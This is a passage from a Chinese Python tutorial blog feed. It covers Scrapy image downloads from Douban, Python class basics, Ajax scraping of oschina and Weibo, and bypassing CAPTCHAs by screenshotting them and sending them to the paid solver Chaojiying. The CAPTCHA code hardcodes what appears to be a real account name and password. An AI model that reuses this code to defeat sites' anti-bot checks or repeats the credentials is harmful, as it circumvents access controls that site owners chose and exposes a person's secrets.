逐个获取电影名和封面网址</span><br>        <span class="hljs-keyword">for</span> info <span class="hljs-keyword">in</span> all_info:<br>            title = info.xpath(<span class="hljs-string">&#x27;./div/div[2]/div/a/span[1]/text()&#x27;</span>).extract_first()<br>            img_url = info.xpath(<span class="hljs-string">&#x27;./div/div[@class=&quot;pic&quot;]/a/img/@src&#x27;</span>).extract_first()<br>            title_list.append(title)<br>            img_url_list.append(img_url)<br>        <span class="hljs-comment"># 激活实体文件</span><br>        item = DoubanItem()<br>        item[<span class="hljs-string">&#x27;name&#x27;</span>] = title_list<br>        item[<span class="hljs-string">&#x27;url&#x27;</span>] = img_url_list<br>        <span class="hljs-keyword">yield</span> item<br><br></code></pre></td></tr></table></figure><h2 id="设置管道文件">5.4 设置管道文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlretrieve<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DoubanPipeline</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_item</span>(<span class="hljs-params">self, item, spider</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(item[<span class="hljs-string">&#x27;name&#x27;</span>])):<br>            <span class="hljs-comment"># 下载图片，现在pipelines.py所在文件夹下创建文件夹`images`</span><br>            urlretrieve(item[<span class="hljs-string">&#x27;url&#x27;</span>][i], <span class="hljs-string">&#x27;images/&#x27;</span> + item[<span class="hljs-string">&#x27;name&#x27;</span>][i] + <span class="hljs-string">&#x27;.png&#x27;</span>)<br>        <span class="hljs-keyword">return</span> item<br></code></pre></td></tr></table></figure><h1 id="python类的相关知识">6. Python类的相关知识</h1><h2 id="类和对象">6.1 类和对象</h2><ul><li>类是不同对象的统称，而对象是类的实例</li><li>Dog类——大黄、来福</li></ul><h2 id="类名属性和方法">6.2 类名、属性和方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span>:<br>    <span class="hljs-comment"># 类属性</span><br>    num_wheels = <span class="hljs-number">4</span><br><br>    <span class="hljs-comment"># 构造方法（初始化方法）</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, make, model, year</span>):<br>        <span class="hljs-comment"># 实例属性</span><br>        self.make = make<br>        self.model = model<br>        self.year = year<br>        self.is_running = <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># 实例方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start_engine</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.year&#125;</span> <span class="hljs-subst">&#123;self.make&#125;</span> <span class="hljs-subst">&#123;self.model&#125;</span>&#x27;s engine is now running.&quot;</span>)<br>        self.is_running = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">stop_engine</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.year&#125;</span> <span class="hljs-subst">&#123;self.make&#125;</span> <span class="hljs-subst">&#123;self.model&#125;</span>&#x27;s engine is now stopped.&quot;</span>)<br>        self.is_running = <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">honk</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.year&#125;</span> <span class="hljs-subst">&#123;self.make&#125;</span> <span class="hljs-subst">&#123;self.model&#125;</span> is honking!&quot;</span>)<br><br><span class="hljs-comment"># 类的实例化</span><br>my_car = Car(make=<span class="hljs-string">&quot;Toyota&quot;</span>, model=<span class="hljs-string">&quot;Camry&quot;</span>, year=<span class="hljs-number">2022</span>)<br><br><span class="hljs-comment"># 访问属性</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;My car is a <span class="hljs-subst">&#123;my_car.year&#125;</span> <span class="hljs-subst">&#123;my_car.make&#125;</span> <span class="hljs-subst">&#123;my_car.model&#125;</span> with <span class="hljs-subst">&#123;Car.num_wheels&#125;</span> wheels.&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Is the engine running? <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;Yes&#x27;</span> <span class="hljs-keyword">if</span> my_car.is_running <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;No&#x27;</span>&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 调用方法</span><br>my_car.start_engine()<br>my_car.honk()<br>my_car.stop_engine()<br></code></pre></td></tr></table></figure><p>现在，让我们逐一解释这个例子中的关键概念：</p><ol type="1"><li><p><strong>类名</strong>：<code>Car</code>是一个类的名称，用于创建车辆对象。</p></li><li><p><strong>类的属性</strong>：在这个例子中，<code>num_wheels</code>是一个类属性，它是所有<code>Car</code>对象共享的属性。实例属性（如<code>make</code>，<code>model</code>，<code>year</code>和<code>is_running</code>）是与每个实例相关联的属性。</p></li><li><p><strong>类的方法</strong>：<code>start_engine</code>，<code>stop_engine</code>和<code>honk</code>是类的方法。方法是与类相关联的函数，它们允许对类的实例进行操作。</p></li><li><p><strong>类的实例化</strong>：通过<code>my_car = Car(make="Toyota", model="Camry", year=2022)</code>创建了<code>Car</code>类的一个实例。在这里，我们使用构造方法<code>__init__</code>来初始化实例的属性。</p></li><li><p><strong>调用属性和方法</strong>：使用点运算符（<code>.</code>）可以<strong>访问实例的属性</strong>和<strong>调用实例的方法</strong>。例如，<code>my_car.year</code>访问了<code>my_car</code>实例的<code>year</code>属性，而<code>my_car.start_engine()</code>调用了<code>start_engine</code>方法。</p></li></ol><h2 id="类的进阶知识">6.3 类的进阶知识</h2><h3 id="self参数">6.3.1 self参数</h3><p>在 Python 中，<code>self</code>是一个约定俗成的名字，用于表示对象实例本身。在类的方法中，<code>self</code>是一个指向实例本身的引用，它允许我们访问实例的属性和调用实例的方法。<code>self</code>参数是类方法的第一个参数，但在调用方法时，你不需要显式传递它，Python会自动处理。</p><p>下面是一些关于 <code>self</code> 的相关知识点：</p><ol type="1"><li><strong><code>self</code> 的命名约定</strong>：<ul><li>虽然使用 <code>self</code>是约定俗成的，但理论上你可以使用其他名称。然而，为了遵循通用的Python编码风格，建议坚持使用<code>self</code>。</li></ul></li><li><strong><code>self</code> 的作用</strong>：<ul><li><code>self</code>提供了对实例本身的引用，使得在类的方法中可以访问实例的属性和调用实例的方法。</li><li>通过<code>self</code>，类的方法可以区分实例属性和全局变量（如果存在同名的情况）。</li></ul></li><li><strong><code>self</code> 不是关键字</strong>：<ul><li>尽管我们通常使用<code>self</code>，但实际上，这只是一个命名约定，而不是Python的关键字。你可以使用其他名称，但是这会让你的代码变得难以理解。</li></ul></li><li><strong>在构造方法中使用 <code>self</code></strong>：<ul><li>在构造方法（<code>__init__</code>）中，<code>self</code>用于引用正在创建的实例，以初始化实例的属性。</li></ul></li></ol><p>下面是一个例子，演示了在类中如何使用 <code>self</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, value</span>):<br>        <span class="hljs-comment"># 使用self初始化实例属性</span><br>        self.value = value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_value</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 使用self访问实例属性</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Value: <span class="hljs-subst">&#123;self.value&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 创建类的实例</span><br>obj = MyClass(value=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># 调用实例方法</span><br>obj.print_value()<br></code></pre></td></tr></table></figure><p>在这个例子中，<code>self</code>用于引用类的实例，让我们能够在方法中访问实例属性。当我们调用<code>obj.print_value()</code> 时，<code>self</code> 隐式地指向<code>obj</code> 实例，使得方法能够访问 <code>obj</code> 的属性<code>value</code>。</p><h3 id="初始化方法">6.3.2 初始化方法</h3><p>在 Python 类中，初始化方法是一个特殊的方法，其名称为<code>__init__</code>。这个方法在创建类的实例时自动调用，用于对实例的属性进行初始化。通过初始化方法，你可以确保在创建对象时进行一些必要的设置操作。以下是有关初始化方法的一些重要信息：</p><ol type="1"><li><p><strong><code>__init__</code> 方法的定义</strong>：初始化方法以<code>__init__</code> 为名称，它的第一个参数通常是<code>self</code>，表示对象实例本身。在初始化方法中，你可以定义其他参数，用于接收创建实例时传递的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, parameter1, parameter2</span>):<br>        <span class="hljs-comment"># 初始化操作</span><br>        self.attribute1 = parameter1<br>        self.attribute2 = parameter2<br></code></pre></td></tr></table></figure></li><li><p><strong>实例属性的初始化</strong>：在初始化方法中，通过<code>self</code>可以访问和初始化实例的属性。这些属性将在对象创建时赋予特定的初值。</p></li><li><p><strong>实例化对象时的参数传递</strong>：当你创建类的实例时，初始化方法会自动调用，并且你可以传递参数给初始化方法，这些参数将用于初始化实例的属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建实例时传递参数</span><br>obj = MyClass(parameter1_value, parameter2_value)<br></code></pre></td></tr></table></figure></li><li><p><strong>初始化方法的调用时机</strong>：初始化方法在创建对象时自动调用，因此它提供了一个在对象被使用之前执行必要设置的机会。这有助于确保对象在被使用之前处于一种合适的状态。</p></li></ol><p>在这个例子中，<code>__init__</code> 方法用于初始化 <code>Dog</code>类的实例属性 <code>name</code> 和<code>age</code>。在创建实例时，我们传递了相应的参数，并通过访问属性和调用方法来使用这些初始化的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        <span class="hljs-comment"># 初始化方法</span><br>        self.name = name<br>        self.age = age<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bark</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.name&#125;</span> says Woof!&quot;</span>)<br><br><span class="hljs-comment"># 创建类的实例并传递参数</span><br>my_dog = Dog(name=<span class="hljs-string">&quot;Buddy&quot;</span>, age=<span class="hljs-number">3</span>)<br><br><span class="hljs-comment"># 访问实例属性</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;My dog&#x27;s name is <span class="hljs-subst">&#123;my_dog.name&#125;</span> and age is <span class="hljs-subst">&#123;my_dog.age&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 调用实例方法</span><br>my_dog.bark()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>网络爬虫案例实战</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ajax动态请求破解</title>
    <link href="/2023/12/13/Python/Spider/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/Ajax%E5%8A%A8%E6%80%81%E8%AF%B7%E6%B1%82%E7%A0%B4%E8%A7%A3/"/>
    <url>/2023/12/13/Python/Spider/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/Ajax%E5%8A%A8%E6%80%81%E8%AF%B7%E6%B1%82%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="引言">0. 引言</h1><p>通常情况下，如果要更新网页中的内容，需要重新加载整个网页。而Ajax动态请求则能在不重新加载整个网页的情况下，与服务器交换数据并更新网页中的部分内容。因此，严格来说，Ajax动态请求并不是一种反爬手段，而是一种网页展示手段。</p><h1 id="ajax简介">1. Ajax简介</h1><p>Ajax动态请求本质上就是把常规的翻页操作做成了动态刷新的效果。</p><h2 id="不同翻页方式对比">1.1 不同翻页方式对比</h2><p><strong>网址中有翻页参数，网页中有翻页按钮</strong></p><ul><li>网址中变化翻页参数</li><li>Selenium库模拟单击下一页</li></ul><p><strong>网址中无翻页参数，网页中有翻页按钮</strong></p><ul><li>Selenium库模拟单击下一页</li></ul><p><strong>既无翻页参数也无翻页按钮，通过滚动页面来加载新内容</strong></p><p>这种加载新内容的方式就是通过Ajax动态请求实现的。如果想要一次爬取“多页”，就需要对Ajax动态请求进行破解。</p><ul><li>找到真正的网址中的翻页参数，然后通过Requests库进行请求（需要分析真正的请求网址）--&gt;案例1</li><li>通过Selenium库模拟鼠标滚轮滚动，变相实现翻页（爬取速度稍慢）--&gt;案例2</li></ul><h2 id="ajax的基本概念与工作原理">1.2 Ajax的基本概念与工作原理</h2><p>Ajax（Asynchronous JavaScript andXML）是一种用于创建动态网页的技术。它允许在不重新加载整个页面的情况下，通过异步方式从服务器获取数据并更新页面的部分内容。一个简单的Ajax请求示例可能如下所示（使用XMLHttpRequest）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascriptCopy codevar xhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">readyState</span> == <span class="hljs-number">4</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-comment">// 处理服务器响应的数据</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;result&quot;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>;<br>  &#125;<br>&#125;;<br>xhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;example.php&quot;</span>, <span class="hljs-literal">true</span>);<br>xhttp.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><h1 id="案例1爬取开源中国博客频道">2. 案例1：爬取开源中国博客频道</h1><p>难点：通过开发者工具分析出Ajax请求的真正URL</p><p>注：使用正则表达式解析和提取数据时，在Requests库获取到的源码和开发者工具看的源码不同时，应以Requests库获取到的源码为准来找寻规律。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>headers = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#x27;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">kaiyuan</span>(<span class="hljs-params">page</span>):<br>    url = <span class="hljs-string">&#x27;https://www.oschina.net/blog/widgets/_blog_index_recommend_list?p=&#x27;</span> + <span class="hljs-built_in">str</span>(page)<br>    res = requests.get(url, headers=headers).text<br><br>    p_title = <span class="hljs-string">&#x27;&lt;a class=&quot;header&quot; href=&quot;.*?&quot; target=&quot;_blank&quot;.*?title=&quot;(.*?)&quot;&gt;&#x27;</span>   <span class="hljs-comment"># 这里唯一的注意点就是target=&quot;_blank&quot;后的.*?（换行）是F12中看不出来的，要在Python获取的源代码res中看</span><br>    title = re.findall(p_title, res, re.S)  <span class="hljs-comment"># 因为有换行，所以要加re.S</span><br><br>    p_href = <span class="hljs-string">&#x27;&lt;a class=&quot;header&quot; href=&quot;(.*?)&quot; target=&quot;_blank&quot;.*?title=&quot;.*?&quot;&gt;&#x27;</span><br>    href = re.findall(p_href, res, re.S)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(title)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;.&#x27;</span> + title[i])<br>        <span class="hljs-built_in">print</span>(href[i])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    kaiyuan(i)<br></code></pre></td></tr></table></figure><h1 id="案例2爬取新浪微博">3. 案例2：爬取新浪微博</h1><p>Selenium核心操作：<code>browser.execute_script('window.scrollTo(0, document.body.scrollHeight);')</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 该代码未对爬取到的数据进行清晰，只是为了演示使用Selenium库</span><br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><br>browser = webdriver.Edge(<span class="hljs-string">&quot;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\MicrosoftWebDriver.exe&quot;</span>)<br>browser.get(<span class="hljs-string">&quot;https://weibo.com/&quot;</span>)<br>browser.maximize_window()<br>time.sleep(<span class="hljs-number">20</span>)  <span class="hljs-comment"># 手动登录</span><br><br>url = <span class="hljs-string">&quot;https://weibo.com/u/5536597433&quot;</span><br>browser.get(url)<br><br><span class="hljs-comment"># 获取页面源码并进行简单解析</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getnewpage</span>():<br>    time.sleep(<span class="hljs-number">2</span>)<br>    data = browser.page_source<br>    p_title = <span class="hljs-string">&#x27;&lt;div class=&quot;detail_wbtext_4CRf9&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span><br>    title = re.findall(p_title, data, re.S)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(title)):<br>        <span class="hljs-built_in">print</span>(title[i])<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    getnewpage()<br>    browser.execute_script(<span class="hljs-string">&#x27;window.scrollTo(0, document.body.scrollHeight);&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h1 id="总结">4. 总结</h1><p>在实际应用中，如果不要求在短时间内爬取大量内容，可以只爬取初始页面的，然后设置定时爬取，把每次新爬取的内容存入数据库。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>网络爬虫案例实战</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>验证码反爬的应对</title>
    <link href="/2023/12/10/Python/Spider/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/%E9%AA%8C%E8%AF%81%E7%A0%81%E5%8F%8D%E7%88%AC%E7%9A%84%E5%BA%94%E5%AF%B9/"/>
    <url>/2023/12/10/Python/Spider/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/%E9%AA%8C%E8%AF%81%E7%A0%81%E5%8F%8D%E7%88%AC%E7%9A%84%E5%BA%94%E5%AF%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="引言">0. 引言</h1><p>有些网站为了避免被过度访问，会设置验证码反爬机制，如果访问次数过多就要求用户输入验证码，甚至一开始访问时就要求输入验证码。验证码类型很多，如：图像验证码、计算题验证码、滑块验证码、滑动拼图验证码、点选验证码。</p><h2 id="超级鹰注册">0.1 超级鹰注册</h2><p><a href="https://www.chaojiying.com/">超级鹰</a>：验证码识别平台</p><h2 id="超级鹰接口">0.2 超级鹰接口</h2><p><ahref="https://www.chaojiying.com/api-14.html">Python语言Demo下载</a>：下载得到一个压缩包，解压后得到的<code>chaojiying.py</code>就是示例代码，然后将该文件拷贝至代码文件目录下。</p><h2 id="软件id">0.3 软件ID</h2><p>生成软件ID，以供后续使用：<code>用户中心→软件ID→生成一个软件ID</code></p><h2 id="调用示例">0.4 调用示例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> chaojiying <span class="hljs-keyword">import</span> Chaojiying_Client<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cjy</span>():<br>    chaojiying = Chaojiying_Client(<span class="hljs-string">&#x27;账户&#x27;</span>, <span class="hljs-string">&#x27;密码&#x27;</span>, <span class="hljs-string">&#x27;软件ID&#x27;</span>)<br>    im =<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a.jpg&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    code=chaojiying.PostPic(im,<span class="hljs-number">1902</span>) <span class="hljs-comment"># 调用PostPic()函数进行识别，返回一个字典，pic_str对应识别结果</span><br>     <span class="hljs-comment"># 1902为验证码类型编号</span><br>    <span class="hljs-keyword">return</span> code<br><br><br>result = cjy()<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><ahref="https://www.chaojiying.com/price.html">验证码类型编号</a>：不同验证码类型，选择不同编号值。</p><p>补充知识点：<code>\</code>在python中有特殊含义，如<code>\n</code>表示换行。在书写绝对路径时需要使用<code>\\</code>，或者在字符串前加一个字母<code>r</code>，或者用<code>/</code>。</p><h1 id="图像验证码">1. 图像验证码</h1><h2 id="英文验证码">1.1 英文验证码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> chaojiying <span class="hljs-keyword">import</span> Chaojiying_Client<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cjy</span>():  <span class="hljs-comment"># 使用超级鹰识别</span><br>    chaojiying = Chaojiying_Client(<span class="hljs-string">&#x27;fgwyt123&#x27;</span>, <span class="hljs-string">&#x27;wyt941025&#x27;</span>, <span class="hljs-string">&#x27;96001&#x27;</span>)  <span class="hljs-comment"># 账号、密码、项目号（这个不用改）</span><br>    im = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()  <span class="hljs-comment"># 本地图片文件路径，需要为a.png名字</span><br>    code = chaojiying.PostPic(im, <span class="hljs-number">1902</span>)[<span class="hljs-string">&#x27;pic_str&#x27;</span>]  <span class="hljs-comment"># 4-6位英文数字用1902</span><br>    <span class="hljs-keyword">return</span> code<br><br><br><span class="hljs-comment"># 1.访问网址</span><br>browser = webdriver.Chrome()<br><span class="hljs-comment"># url = r&#x27;E:\验证码反爬\英文图像验证码\index.html&#x27;</span><br>current_dir = os.path.dirname(os.path.abspath(__file__))  <span class="hljs-comment"># 获取代码所在的文件夹目录，照抄这行代码即可</span><br>url = current_dir + <span class="hljs-string">&#x27;/index.html&#x27;</span>  <span class="hljs-comment"># 获取HTML文件的文件绝对路径，/相当于\\，所以拼接的时候也可以写&#x27;\\index.html&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;此时的文件路径为：&#x27;</span> + url)  <span class="hljs-comment"># 所以如果文件位置固定，可以直接写url = r&#x27;文件路径&#x27;</span><br>browser.get(url)  <span class="hljs-comment"># 访问网址</span><br><br><span class="hljs-comment"># 2.截取验证码图片</span><br>browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;verifyCanvas&quot;]&#x27;</span>).screenshot(<span class="hljs-string">&#x27;a.png&#x27;</span>)  <span class="hljs-comment"># 截取验证码图片</span><br><br><span class="hljs-comment"># 3.通过超级鹰识别</span><br>result = cjy()  <span class="hljs-comment"># 使用超级鹰OCR识别内容</span><br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment"># 4.模拟键盘输入内容，并模拟点击确认按钮</span><br>browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;code_input&quot;]&#x27;</span>).send_keys(result)  <span class="hljs-comment"># 输入答案</span><br>browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;my_button&quot;]&#x27;</span>).click()  <span class="hljs-comment"># 模拟点击确认按钮</span><br></code></pre></td></tr></table></figure><h2 id="中文验证码">1.2 中文验证码</h2><p>中文验证码的识别方法和英文验证码的识别方法基本一致，唯一需要修改的就是自定义函数<code>cjy</code>调用的<code>PostPic()</code>的验证码类型参数，修改为2004。</p><h1 id="计算题验证码">2. 计算题验证码</h1><p>它与普通图像验证码的区别在于增加了数学运算，需要将验证码中数学计算题的结果填到文本框中，再点击验证。计算题验证码的处理难点在于运算符号的识别，但超级鹰已经提供了用于识别此类验证码的接口。</p><p>代码修改：<code>PostPic()</code>的验证码类型参数修改为6001。</p><h1 id="滑块验证码">3. 